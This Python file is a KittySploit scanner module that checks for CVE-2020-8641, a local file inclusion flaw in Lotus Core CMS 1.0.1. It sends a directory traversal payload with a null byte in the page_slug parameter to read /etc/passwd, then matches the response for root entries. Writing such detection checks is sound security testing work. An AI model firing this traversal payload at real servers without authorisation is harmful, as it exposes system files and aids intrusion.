#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Lotus Core CMS 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lotus Core CMS 1.0.1 - Local File Inclusion Detection',
        'description': 'Lotus Core CMS 1.0.1 allows authenticated local file inclusion of .php files via directory traversal in the index.php page_slug parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lfi', 'lotus', 'cms', 'edb', 'lotus_core_cms_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2020010234',
            'https://www.exploit-db.com/exploits/47985',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8641',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-8641',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?page_slug=../../../../../etc/passwd%00', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Lotus Core CMS 1.0.1 - Local File Inclusion detected",
                path='/index.php?page_slug=../../../../../etc/passwd%00',
            )
            return True
        return False

